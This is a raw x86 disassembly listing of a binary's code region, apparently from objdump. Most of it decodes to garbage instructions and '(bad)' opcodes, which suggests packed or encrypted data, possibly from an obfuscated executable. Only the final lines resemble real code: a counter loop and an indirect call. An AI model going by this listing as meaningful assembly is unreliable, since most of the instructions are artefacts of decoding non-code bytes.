  4135fa:	push   esi
  4135fb:	cmp    edi,DWORD PTR [ecx-0x7abd493f]
  413601:	xchg   ebp,eax
  413602:	loopne 0x413614
  413604:	cli    
  413605:	xor    BYTE PTR [eax-0x34],0x77
  413609:	mov    BYTE PTR [esi],0x3a
  41360c:	shld   DWORD PTR [edx+ecx*2-0x22],esp,cl
  413611:	fisttp DWORD PTR [edi]
  413613:	call   0xd22e4bd4
  413618:	std    
  413619:	add    eax,0x51db7cef
  41361e:	mov    edi,0x28a74f15
  413623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413624:	dec    esp
  413625:	dec    esp
  413626:	jnp    0x4135cd
  413628:	outs   dx,DWORD PTR ds:[esi]
  413629:	xlat   BYTE PTR ds:[ebx]
  41362a:	push   esi
  41362b:	sbb    eax,0x1236ade
  413630:	fld    DWORD PTR [edx+0x143d7055]
  413636:	das    
  413637:	jmp    0x41362b
  413639:	pop    esi
  41363a:	fild   WORD PTR [esi]
  41363c:	push   0xdebaaa38
  413641:	out    0xa3,al
  413643:	xchg   edx,eax
  413644:	les    ecx,FWORD PTR [edx+0x7442eaed]
  41364a:	xor    DWORD PTR [edi+0x7d],ecx
  41364d:	and    eax,0x19cb39a0
  413652:	cli    
  413653:	daa    
  413654:	(bad)  
  413655:	mov    dl,0xeb
  413657:	and    edx,0x67
  41365a:	jg     0x4135f3
  41365c:	xchg   dh,bh
  41365e:	jp     0x4136a0
  413660:	push   esi
  413661:	xlat   BYTE PTR ds:[ebx]
  413662:	int3   
  413663:	add    cl,cl
  413665:	xchg   ebx,eax
  413666:	push   es
  413667:	inc    ebp
  413668:	add    edx,0xffffffdd
  41366b:	fsubr  DWORD PTR [ecx]
  41366d:	jno    0x41367b
  41366f:	test   BYTE PTR [eax-0x2c1bdaa0],dh
  413675:	adc    ebx,DWORD PTR [ecx+0x151cd14e]
  41367b:	data16 (bad) [ecx-0x58]
  41367f:	mov    al,ds:0x4b059a73
  413684:	icebp  
  413685:	pop    esi
  413686:	mov    edi,0xf33b5694
  41368b:	call   0x4ff7a552
  413690:	into   
  413691:	add    esp,DWORD PTR [esi-0x7a]
  413694:	xchg   esp,eax
  413695:	push   ecx
  413696:	ins    DWORD PTR es:[edi],dx
  413697:	cmp    DWORD PTR [edi],0x22
  41369a:	aas    
  41369b:	sbb    BYTE PTR [edi-0x4a63b013],ch
  4136a1:	out    0x8f,al
  4136a3:	push   ebx
  4136a4:	int3   
  4136a5:	xchg   BYTE PTR [edx-0x35ad064a],cl
  4136ab:	sub    al,0x4b
  4136ad:	or     al,0xaa
  4136af:	push   edi
  4136b0:	jnp    0x413725
  4136b2:	ja     0x413651
  4136b4:	cwde   
  4136b5:	mov    DWORD PTR [eax+eax*1],esi
  4136b8:	jae    0x41366c
  4136ba:	lahf   
  4136bb:	push   0x38
  4136bd:	fnsave [esi-0x63]
  4136c0:	not    BYTE PTR [edx+edx*1+0x43]
  4136c4:	cmp    al,0xc7
  4136c6:	jmp    0x54c349da
  4136cb:	or     ch,BYTE PTR [eax+0x2ef7ef6a]
  4136d1:	fbld   TBYTE PTR [edi]
  4136d3:	mov    ebp,0xf13edd6d
  4136d8:	xchg   ecx,eax
  4136d9:	popa   
  4136da:	sbb    edx,ebp
  4136dc:	sbb    BYTE PTR [eax],dh
  4136de:	hlt    
  4136df:	cmovno esi,DWORD PTR [ebx-0x201f60e4]
  4136e6:	sahf   
  4136e7:	adc    esp,edi
  4136e9:	and    DWORD PTR [edi-0x4],ebx
  4136ec:	mov    al,ds:0xca1f655c
  4136f1:	adc    eax,0x398a71e0
  4136f6:	mov    cl,0xdb
  4136f8:	or     DWORD PTR [ebx],eax
  4136fa:	or     al,0xe9
  4136fc:	inc    ecx
  4136fd:	xor    al,0xe7
  4136ff:	call   0x24a7:0x9d7e5135
  413706:	xchg   esi,eax
  413707:	mov    DWORD PTR [esi-0x63],ecx
  41370a:	aaa    
  41370b:	fsubr  QWORD PTR [esi+0x531d4ac4]
  413711:	repz adc al,0x52
  413714:	and    ecx,ecx
  413716:	push   ecx
  413717:	dec    BYTE PTR [ebp+0x46c1c72f]
  41371d:	pusha  
  41371e:	scas   al,BYTE PTR es:[edi]
  41371f:	jnp    0x4136c2
  413721:	rol    BYTE PTR [edx+0x55],0xb4
  413725:	pop    ebx
  413726:	inc    esi
  413727:	ja     0x41373a
  413729:	mov    ebx,edi
  41372b:	lods   eax,DWORD PTR ds:[esi]
  41372c:	lock bound esi,QWORD PTR [ebp-0x22]
  413730:	adc    ecx,ebp
  413732:	sahf   
  413733:	sbb    ebp,DWORD PTR [edi]
  413735:	pop    ss
  413736:	shl    cl,1
  413738:	mov    ecx,0xbbc5088d
  41373d:	xchg   DWORD PTR [edi-0x429179fc],ecx
  413743:	pushf  
  413744:	retf   0x640c
  413747:	outs   dx,DWORD PTR ds:[esi]
  413748:	mov    ebx,DWORD PTR [esi]
  41374a:	pop    esp
  41374b:	xchg   ebx,eax
  41374c:	and    ebp,DWORD PTR [edi+0x74bdf37a]
  413752:	adc    BYTE PTR [edx+eiz*8+0x6bb58baa],al
  413759:	sub    ch,BYTE PTR [ecx]
  41375b:	push   esi
  41375c:	and    al,ch
  41375e:	gs jne 0x4137a2
  413761:	and    al,0x3b
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	push   es
  41377f:	pusha  
  413780:	loope  0x4137cd
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x413805
  41378b:	mov    bh,0xd6
  41378d:	jg     0x4137e2
  41378f:	scas   eax,DWORD PTR es:[edi]
  413790:	pop    ebp
  413791:	ins    BYTE PTR es:[edi],dx
  413792:	mov    BYTE PTR [ecx-0x4a],dl
  413795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413796:	sbb    bl,BYTE PTR [edx+0x2610535e]
  41379c:	jno    0x4137af
  41379e:	xor    al,BYTE PTR [ebx-0x2acd635b]
  4137a4:	(bad)
  4137a7:	xchg   edx,eax
  4137a8:	repnz sti 
  4137aa:	sub    BYTE PTR [eax+edi*2+0x27],ah
  4137ae:	mov    dl,0xcc
  4137b0:	in     al,dx
  4137b1:	push   edi
  4137b2:	popa   
  4137b3:	jnp    0x4137a9
  4137b5:	gs jecxz 0x413827
  4137b8:	faddp  st(0),st
  4137ba:	mov    eax,0x96e38993
  4137bf:	jecxz  0x4137a4
  4137c1:	sbb    esp,DWORD PTR [edi]
  4137c3:	add    ecx,DWORD PTR [eax+edi*1+0x564155c0]
  4137ca:	fld    TBYTE PTR [edi+0x6]
  4137cd:	addr16 jno 0x4137ee
  4137d0:	jo     0x4137e2
  4137d2:	dec    ecx
  4137d3:	xchg   esp,eax
  4137d4:	jno    0x41382d
  4137d6:	jmp    0x413818
  4137d8:	int3   
  4137d9:	push   eax
  4137da:	repnz cwde 
  4137dc:	into   
  4137dd:	mov    al,0x9d
  4137df:	sbb    eax,0x3e4e8465
  4137e4:	arpl   WORD PTR [eax+ebx*2-0x79],bp
  4137e8:	hlt    
  4137e9:	test   DWORD PTR [esp+esi*2+0x2b],esp
  4137ed:	mov    esi,DWORD PTR [eax+0x2593e655]
  4137f3:	dec    eax
  4137f4:	sub    bl,BYTE PTR ds:0x84128dfc
  4137fa:	jecxz  0x41379a
  4137fc:	fsub   DWORD PTR [ebp+eax*8+0x28]
  413800:	push   edx
  413801:	push   es
  413802:	cmp    eax,DWORD PTR [eax-0x8]
  413805:	xor    BYTE PTR [ebx+0x2e],cl
  413808:	sub    esi,0xc28cd348
  41380e:	push   edx
  41380f:	xchg   edi,eax
  413810:	mov    ecx,0x75fd33c
  413815:	ins    DWORD PTR es:[edi],dx
  413816:	sbb    BYTE PTR [ebx],0xa2
  413819:	out    0x5,eax
  41381b:	ret    0x7ccd
  41381e:	mov    esi,0x7881cd6e
  413823:	icebp  
  413824:	gs inc eax
  413826:	leave  
  413827:	sbb    dl,BYTE PTR [ecx]
  413829:	imul   esp,DWORD PTR [eax],0x20b6656e
  41382f:	sahf   
  413830:	push   ss
  413831:	xlat   BYTE PTR ds:[ebx]
  413832:	sbb    DWORD PTR [edx+0x63],ecx
  413835:	ins    DWORD PTR es:[edi],dx
  413836:	in     al,dx
  413837:	jb     0x41389d
  413839:	xor    eax,0xfb3192
  41383e:	shl    DWORD PTR [eax-0x213118d6],1
  413844:	test   al,ch
  413846:	jmp    0x6a6a:0xc23b1f8d
  41384d:	pop    edi
  41384e:	xor    dh,al
  413850:	rcl    BYTE PTR ds:0xc5b6c829,cl
  413856:	jne    0x4138c8
  413858:	es lods eax,DWORD PTR gs:[esi]
  41385b:	inc    edx
  41385c:	mov    bh,0x9a
  41385e:	(bad)  
  41385f:	sti    
  413860:	lods   eax,DWORD PTR ds:[esi]
  413861:	mov    ecx,0x48f3385f
  413866:	mov    esp,0x5c916e06
  41386b:	mov    dl,0x2a
  41386d:	mov    dl,BYTE PTR [edx+edi*8]
  413870:	sub    al,0x6c
  413872:	push   edi
  413873:	or     DWORD PTR gs:[eax+0x2],edx
  413877:	mov    bh,0x3
  413879:	lahf   
  41387a:	pop    esp
  41387b:	int3   
  41387c:	test   DWORD PTR fs:[edx],0x7e1ad93e
  413883:	in     eax,0xcd
  413885:	arpl   cx,cx
  413887:	or     DWORD PTR [edx-0x2e],edx
  41388a:	jno    0x41387b
  41388c:	fistp  WORD PTR [ebp-0x6e]
  41388f:	aas    
  413890:	(bad)  
  413891:	mov    BYTE PTR [ecx-0x604e4131],0xe4
  413898:	jmp    0x413904
  41389a:	imul   ebx,edi,0xd3282af8
  4138a0:	sbb    bh,ah
  4138a2:	ds push edi
  4138a4:	add    WORD PTR [edx],di
  4138a7:	fdivr  QWORD PTR [esp+ebp*2+0x62bd2029]
  4138ae:	fwait
  4138af:	icebp  
  4138b0:	dec    ecx
  4138b1:	mov    edi,0x5d3168ac
  4138b6:	dec    ecx
  4138b7:	out    dx,al
  4138b8:	mov    bh,dh
  4138ba:	or     ah,BYTE PTR [ebp-0x7d813a1b]
  4138c0:	mov    ebx,0xb3c5e0cb
  4138c5:	repz (bad) [eax+0x2c]
  4138c9:	neg    BYTE PTR [edx+ebx*2]
  4138cc:	push   esi
  4138cd:	or     dl,bl
  4138cf:	sub    ecx,DWORD PTR [ebx]
  4138d1:	dec    ecx
  4138d2:	lods   eax,DWORD PTR ds:[esi]
  4138d3:	call   FWORD PTR [edx-0x1e09fb6]
  4138d9:	test   ah,cl
  4138db:	sub    bl,BYTE PTR [eax]
  4138dd:	retf   0x2eaf
  4138e0:	sbb    BYTE PTR [ebp+0x187b000f],ch
  4138e6:	call   0x7eb4:0xf3236901
  4138ed:	test   DWORD PTR [eax-0x6fd08e5e],edx
  4138f3:	je     0x413885
  4138f5:	sub    eax,0xc51a40a0
  4138fa:	lock mov ebx,0x4b860112
  413900:	adc    cl,0x1d
  413903:	nop
  413904:	dec    ebx
  413905:	cmp    al,ah
  413907:	and    esi,ebp
  413909:	adc    BYTE PTR [esi-0x7a5214ea],bh
  41390f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413910:	xor    bl,BYTE PTR ds:0x9eea038d
  413916:	sbb    ebp,DWORD PTR [eax]
  413918:	mov    ah,0xaa
  41391a:	add    edx,eax
  41391c:	or     dl,BYTE PTR [edi]
  41391e:	popa   
  41391f:	call   0x7e7e85b9
  413924:	mov    bl,0x77
  413926:	loopne 0x413986
  413928:	into   
  413929:	mov    ds:0x1f393e05,eax
  41392e:	mov    ?,WORD PTR [ebp-0x1f]
  413931:	lods   al,BYTE PTR ds:[esi]
  413932:	xchg   ebp,eax
  413933:	jle    0x41393a
  413935:	outs   dx,BYTE PTR ds:[esi]
  413936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413937:	and    BYTE PTR [edi+0x7f4c9ca2],cl
  41393d:	ins    DWORD PTR es:[edi],dx
  41393e:	or     esp,ecx
  413940:	xchg   BYTE PTR [esi],ah
  413942:	test   BYTE PTR [edi+0x45fa0326],0xff
  413949:	addr16 adc al,bl
  41394c:	push   cs
  41394d:	jbe    0x413998
  41394f:	loop   0x41390a
  413951:	add    eax,0xe66d1a36
  413956:	inc    eax
  413957:	iret   
  413958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413959:	lods   eax,DWORD PTR ds:[esi]
  41395a:	dec    esi
  41395b:	fimul  WORD PTR [esi+0x5]
  41395e:	dec    esi
  41395f:	sar    BYTE PTR [ebx+0x42],1
  413962:	pusha  
  413963:	sub    ah,BYTE PTR [ebp+0x17]
  413966:	iret   
  413967:	jno    0x413995
  413969:	test   BYTE PTR [ebp-0x1],0xc7
  41396d:	and    BYTE PTR [ecx-0xb],bh
  413970:	xchg   edi,eax
  413971:	lods   al,BYTE PTR ds:[esi]
  413972:	test   BYTE PTR [ecx-0x28],al
  413975:	xor    eax,0x4a3d0804
  41397a:	out    dx,al
  41397b:	pushf  
  41397c:	xchg   edi,eax
  41397d:	iret   
  41397e:	adc    ah,BYTE PTR [ebp+ebp*1+0x64]
  413982:	outs   dx,BYTE PTR ds:[esi]
  413983:	xchg   edi,eax
  413984:	dec    eax
  413985:	pop    ebx
  413986:	inc    ebp
  413987:	sbb    DWORD PTR [ebp+0x55e36d76],edi
  41398d:	rcr    BYTE PTR [esi-0x42],0x31
  413991:	out    dx,al
  413992:	jg     0x4139e3
  413994:	adc    edi,esp
  413996:	cli    
  413997:	das    
  413998:	ret    
  413999:	inc    esi
  41399a:	mov    eax,ds:0xf39a4457
  41399f:	sub    cl,ah
  4139a1:	leave  
  4139a2:	aad    0xa8
  4139a4:	out    0x51,eax
  4139a6:	cmp    BYTE PTR [eax+edx*8-0x384f2648],al
  4139ad:	sahf   
  4139ae:	test   eax,0x7db5f706
  4139b3:	add    eax,0x727401e2
  4139b8:	dec    eax
  4139b9:	dec    eax
  4139ba:	mov    esi,DWORD PTR [ecx+0x8]
  4139bd:	adc    BYTE PTR [esi],bl
  4139bf:	cmc    
  4139c0:	out    dx,al
  4139c1:	rcl    ebx,0x8b
  4139c4:	jp     0x41395f
  4139c6:	ror    DWORD PTR [edx-0x67],1
  4139c9:	jg     0x41397e
  4139cb:	xor    BYTE PTR [ebx],ch
  4139cd:	cmc    
  4139ce:	adc    DWORD PTR [eax-0x42a6635c],edx
  4139d4:	bound  esi,QWORD PTR [edi-0x20728d]
  4139da:	dec    ecx
  4139db:	inc    esp
  4139dc:	ret    
  4139dd:	push   ss
  4139de:	sbb    ebx,DWORD PTR [edx+ebx*1]
  4139e1:	popa   
  4139e2:	or     eax,0xf0192843
  4139e7:	jnp    0x413a27
  4139e9:	dec    edx
  4139ea:	cwde   
  4139eb:	cmp    BYTE PTR [eax-0x1519e7ae],0xd7
  4139f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f3:	or     eax,0x221526ac
  4139f8:	jmp    0x4139e4
  4139fa:	adc    BYTE PTR [edx+0x19],0x23
  4139fe:	sub    DWORD PTR [eax-0x71],esp
  413a01:	and    esp,DWORD PTR [eax-0x1eca3e0b]
  413a07:	scas   eax,DWORD PTR es:[edi]
  413a08:	aam    0x6f
  413a0a:	loop   0x413996
  413a0c:	mov    edi,0x306f14d4
  413a11:	js     0x4139b1
  413a13:	push   es
  413a14:	push   ebx
  413a15:	add    al,0x26
  413a17:	das    
  413a18:	sbb    al,0x26
  413a1a:	daa    
  413a1b:	and    BYTE PTR [esi],ch
  413a1d:	je     0x413a1d
  413a1f:	mov    ah,0xa6
  413a21:	jae    0x413a41
  413a23:	and    BYTE PTR [edi],al
  413a25:	je     0x413a67
  413a27:	inc    eax
  413a28:	(bad)  
  413a29:	pop    ebp
  413a2a:	cmp    BYTE PTR [eax],0xaa
  413a2d:	inc    ecx
  413a2e:	push   edi
  413a2f:	in     al,0xbb
  413a31:	rol    DWORD PTR [ecx+0x1b],1
  413a34:	xchg   ecx,eax
  413a35:	cli    
  413a36:	sub    ah,dl
  413a38:	daa    
  413a39:	push   ebp
  413a3a:	es inc ecx
  413a3c:	aad    0x7c
  413a3e:	inc    edi
  413a3f:	sub    DWORD PTR [edx+0x54],ebx
  413a42:	cmp    DWORD PTR [eax],edx
  413a44:	mov    edx,DWORD PTR [ebx+0x49]
  413a47:	push   es
  413a48:	dec    ecx
  413a49:	mov    dh,0xfd
  413a4b:	pop    edx
  413a4c:	js     0x413acb
  413a4e:	dec    ecx
  413a4f:	pop    ds
  413a50:	sub    eax,0x77
  413a53:	mov    ebp,0xdfe9ffff
  413a58:	add    al,BYTE PTR [eax]
  413a5a:	add    BYTE PTR [ebx+0x6d],bl
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	jl     0x413aa8
  413a69:	cdq    
  413a6a:	scas   al,BYTE PTR es:[edi]
  413a6b:	jle    0x413ad5
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0xa770707e
  413a74:	xchg   esp,eax
  413a75:	fs es jb 0x413a54
  413a79:	xchg   DWORD PTR cs:[ecx+0x44],ebp
  413a7d:	stos   DWORD PTR es:[edi],eax
  413a7e:	(bad)  
  413a7f:	push   cs
  413a80:	mov    WORD PTR [edx+0x7c],ss
  413a83:	xchg   edi,eax
  413a84:	aaa    
  413a85:	shl    edx,1
  413a87:	jp     0x413a7b
  413a89:	loop   0x413a1f
  413a8b:	sar    BYTE PTR [eax],1
  413a8d:	jmp    0x5a86:0x3da12287
  413a94:	int    0xdc
  413a96:	mov    BYTE PTR ss:[ecx+0x2b6d9072],ah
  413a9d:	les    ebp,FWORD PTR ds:0x9500f04b
  413aa3:	(bad)  ds:0x792dbbbe
  413aa9:	cld    
  413aaa:	cld    
  413aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aac:	repz push es
  413aae:	leave  
  413aaf:	sub    BYTE PTR [ebx],0x8
  413ab2:	push   0xc6163c37
  413ab7:	sbb    al,0xcf
  413ab9:	(bad)  
  413aba:	std    
  413abb:	lds    edi,FWORD PTR [edx+0x3d654853]
  413ac1:	push   esp
  413ac2:	jo     0x413ab4
  413ac4:	pop    ecx
  413ac5:	pop    ecx
  413ac6:	push   ecx
  413ac7:	lods   al,BYTE PTR ds:[esi]
  413ac8:	daa    
  413ac9:	out    dx,al
  413aca:	jge    0x413a69
  413acc:	int3   
  413acd:	cli    
  413ace:	cmp    al,0x16
  413ad0:	add    DWORD PTR [eax-0x31],edi
  413ad3:	push   ebx
  413ad4:	nop
  413ad5:	sbb    esi,DWORD PTR [ebp-0x39]
  413ad8:	test   eax,0x2baecfca
  413add:	imul   DWORD PTR [edi]
  413adf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae0:	pusha  
  413ae1:	(bad)  
  413ae2:	push   ebp
  413ae3:	xchg   BYTE PTR [ebx+0x174f62b8],bl
  413ae9:	dec    eax
  413aea:	jno    0x413aad
  413aec:	out    0x24,al
  413aee:	imul   esp,DWORD PTR [eax+edx*8+0x29],0xffffffe2
  413af3:	xchg   edi,eax
  413af4:	fs inc eax
  413af6:	cmp    BYTE PTR [eax+ecx*1-0x2dbd8038],0xb4
  413afe:	sti    
  413aff:	mov    bh,0xaa
  413b01:	pop    esi
  413b02:	mov    cl,0x77
  413b04:	mov    al,BYTE PTR [eax+0x2aca6fc1]
  413b0a:	push   es
  413b0b:	push   esi
  413b0c:	and    edx,edx
  413b0e:	xor    al,0xcf
  413b10:	daa    
  413b11:	jl     0x413b14
  413b13:	jb     0x413ad1
  413b15:	out    dx,eax
  413b16:	ret    
  413b17:	mov    eax,0xac9ab98
  413b1c:	pop    ecx
  413b1d:	inc    edx
  413b1e:	push   es
  413b1f:	lods   al,BYTE PTR ds:[esi]
  413b20:	or     ch,BYTE PTR [edx+0x72]
  413b23:	sahf   
  413b24:	rcr    ah,cl
  413b26:	ins    BYTE PTR es:[edi],dx
  413b27:	xor    eax,0xf938054b
  413b2c:	(bad)  
  413b2d:	cmp    BYTE PTR ds:0x769fe0c9,cl
  413b33:	gs out 0x72,eax
  413b36:	pushf  
  413b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b38:	repnz pop edi
  413b3a:	bound  esp,QWORD PTR [ebx-0x29be3f19]
  413b40:	mov    BYTE PTR [ecx-0x29a3bdc8],bh
  413b46:	lods   al,BYTE PTR ds:[esi]
  413b47:	jp     0x413b20
  413b49:	into   
  413b4a:	add    DWORD PTR [esi+0x72],ecx
  413b4d:	ficomp WORD PTR ds:0x566df529
  413b53:	nop
  413b54:	(bad)  
  413b55:	pop    edi
  413b56:	mov    al,0x9a
  413b58:	lods   eax,DWORD PTR ds:[esi]
  413b59:	add    edx,DWORD PTR [ebx+0xb]
  413b5c:	push   edi
  413b5d:	pop    es
  413b5e:	or     al,0xb1
  413b60:	mov    edi,0x4b952d63
  413b65:	cs mov al,0x26
  413b68:	fistp  DWORD PTR [eax]
  413b6a:	mov    eax,0xcfa35ead
  413b6f:	and    ch,BYTE PTR [ebx]
  413b71:	mov    ds:0x8bf220f,eax
  413b76:	xor    ah,BYTE PTR [esi]
  413b78:	mov    esp,0x1fb43ca2
  413b7d:	js     0x413bdd
  413b7f:	mov    ds:0x107a4a6f,al
  413b84:	push   es
  413b85:	in     al,dx
  413b86:	sbb    DWORD PTR [ebp-0x4f],esi
  413b89:	lock lods al,BYTE PTR ds:[esi]
  413b8b:	bound  ebx,QWORD PTR [ebp+0x39ab2b1]
  413b91:	aaa    
  413b92:	cmp    ebp,DWORD PTR [edx+0x554044eb]
  413b98:	inc    esp
  413b99:	lods   eax,DWORD PTR ds:[esi]
  413b9a:	and    esi,DWORD PTR [esp+ebx*4]
  413b9d:	pop    esi
  413b9e:	add    DWORD PTR [edi-0x17],esi
  413ba1:	sbb    al,0x50
  413ba3:	xchg   ebp,eax
  413ba4:	pushf  
  413ba5:	inc    esi
  413ba6:	out    0xbe,eax
  413ba8:	jns    0x413b43
  413baa:	test   al,0xda
  413bac:	fdiv   DWORD PTR [eax+0x19]
  413baf:	jb     0x413c02
  413bb1:	dec    ecx
  413bb2:	jg     0x413bbf
  413bb4:	nop
  413bb5:	ins    BYTE PTR es:[edi],dx
  413bb6:	iret   
  413bb7:	xchg   ecx,eax
  413bb8:	addr16 adc eax,0xbc072d5
  413bbe:	push   edi
  413bbf:	push   es
  413bc0:	arpl   WORD PTR [esi+0x35f79651],dx
  413bc6:	inc    esp
  413bc7:	push   0x4a2a2131
  413bcc:	xchg   esp,eax
  413bcd:	push   edx
  413bce:	adc    cl,bh
  413bd0:	retf   
  413bd1:	(bad)  
  413bd2:	cmp    DWORD PTR [esi],esi
  413bd4:	jae    0x413c4c
  413bd6:	les    edi,FWORD PTR [ebx-0x60]
  413bd9:	loope  0x413c25
  413bdb:	pop    ebx
  413bdc:	xchg   ecx,eax
  413bdd:	mov    ds:0x88a1f2ff,al
  413be2:	add    al,0x4e
  413be4:	push   0x17
  413be6:	dec    edx
  413be7:	popa   
  413be8:	daa    
  413be9:	iret   
  413bea:	iret   
  413beb:	add    DWORD PTR [ebx-0xb],ecx
  413bee:	hlt    
  413bef:	xor    bh,BYTE PTR ds:0x2fadd719
  413bf5:	sbb    edx,ebx
  413bf7:	pusha  
  413bf8:	pop    esi
  413bf9:	pop    eax
  413bfa:	cmp    esp,DWORD PTR [ebp-0x55]
  413bfd:	pusha  
  413bfe:	mul    dl
  413c00:	into   
  413c01:	mov    esp,?
  413c03:	call   0xe3eb:0x8bb28e7
  413c0a:	push   esp
  413c0b:	jb     0x413c33
  413c0d:	dec    ebx
  413c0e:	sub    BYTE PTR [eax+0x400facaa],0xab
  413c15:	inc    ebp
  413c16:	mov    BYTE PTR [ebp+0x63144587],0x68
  413c1d:	sahf   
  413c1e:	mov    cl,0x6f
  413c20:	stos   BYTE PTR es:[edi],al
  413c21:	leave  
  413c22:	adc    ebx,DWORD PTR [esi]
  413c24:	jp     0x413be6
  413c26:	cmp    ebp,DWORD PTR [edx-0x66]
  413c29:	mov    bl,0xd8
  413c2b:	call   DWORD PTR ds:0x885c04a1
  413c31:	add    DWORD PTR [esi+ecx*4],esi
  413c34:	jmp    0x413bd8
  413c36:	out    dx,eax
  413c37:	and    DWORD PTR [edi],ebp
  413c39:	and    BYTE PTR [edx],bl
  413c3b:	loopne 0x413c15
  413c3d:	dec    edi
  413c3e:	dec    edi
  413c3f:	fsubr  DWORD PTR [ebp+0x3bb837b5]
  413c45:	aaa    
  413c46:	jp     0x413bdf
  413c48:	xchg   esi,eax
  413c49:	int3   
  413c4a:	jb     0x413c0d
  413c4c:	sbb    ebp,edx
  413c4e:	loop   0x413c1d
  413c50:	out    dx,eax
  413c51:	nop
  413c52:	scas   eax,DWORD PTR es:[edi]
  413c53:	aaa    
  413c54:	daa    
  413c55:	cmc    
  413c56:	cmp    BYTE PTR [edx],bl
  413c58:	out    0xb3,eax
  413c5a:	clc    
  413c5b:	and    ebp,edx
  413c5d:	or     eax,0x7fbbe2d2
  413c62:	ret    
  413c63:	outs   dx,BYTE PTR ds:[esi]
  413c64:	xchg   edi,eax
  413c65:	outs   dx,DWORD PTR ds:[esi]
  413c66:	sub    esp,ebx
  413c68:	iret   
  413c69:	nop
  413c6a:	arpl   WORD PTR [eax-0x35],bp
  413c6d:	xchg   edx,eax
  413c6e:	mov    cl,0xb7
  413c70:	gs clc 
  413c72:	pop    ebx
  413c73:	xchg   BYTE PTR [edx+ebp*4],bl
  413c76:	adc    eax,0x10959e15
  413c7b:	jle    0x413cb2
  413c7d:	mov    eax,0x96ec50f1
  413c82:	push   ebp
  413c83:	dec    esp
  413c84:	dec    ecx
  413c85:	jmp    0x413c85
  413c87:	out    dx,al
  413c88:	adc    DWORD PTR [edi+0x68954239],esp
  413c8e:	cdq    
  413c8f:	mov    ds:0x6a01b473,al
  413c95:	shl    BYTE PTR [esi+ebx*2+0x16114fae],0x67
  413c9d:	dec    edi
  413c9e:	into   
  413c9f:	aam    0xf9
  413ca1:	repnz repnz mov WORD PTR [eax+0x14],cs
  413ca6:	in     al,dx
  413ca7:	enter  0x50c8,0x7a
  413cab:	mov    cl,0x82
  413cad:	cmp    bh,BYTE PTR [esi+ecx*4-0x56f81ced]
  413cb4:	dec    ebx
  413cb5:	scas   al,BYTE PTR es:[edi]
  413cb6:	mov    eax,ebx
  413cb8:	(bad)
  413cbb:	mov    ecx,0xef47faca
  413cc0:	or     al,0xdf
  413cc2:	repz repnz not BYTE PTR [edx]
  413cc6:	mov    edi,0xf5d3429
  413ccb:	adc    edx,DWORD PTR ds:0xb56e4fcd
  413cd1:	into   
  413cd2:	idiv   DWORD PTR [esi+ebx*2+0x3dff654a]
  413cd9:	aam    0x71
  413cdb:	xchg   DWORD PTR [ebx],edx
  413cdd:	(bad)
  413ce1:	and    eax,0x1999b2
  413ce6:	mov    eax,ds:0x8d5fd384
  413ceb:	jmp    0x8da2:0x35f6b1e2
  413cf2:	jmp    0x413c96
  413cf4:	cs retf 0xdb0e
  413cf8:	ret    0xdcea
  413cfb:	jp     0x413d1c
  413cfd:	(bad)  
  413cff:	mov    edi,0xee4e2e9b
  413d04:	adc    al,0x1a
  413d06:	enter  0xcd74,0x15
  413d0a:	jmp    0x5a206b53
  413d0f:	outs   dx,DWORD PTR ds:[esi]
  413d10:	mov    esi,0xf26a6dd0
  413d15:	inc    ebp
  413d16:	add    ebx,ebx
  413d18:	mov    al,0x46
  413d1a:	sbb    edi,DWORD PTR [ecx+0xe39ccae]
  413d20:	imul   ebx,DWORD PTR [ecx-0x49],0x9d9911fd
  413d27:	and    ebx,DWORD PTR [esi-0x38]
  413d2a:	enter  0x70df,0xdc
  413d2e:	pusha  
  413d2f:	clc    
  413d30:	jnp    0x413ced
  413d32:	in     eax,dx
  413d33:	push   es
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	mov    ecx,0x81a2e5d2
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
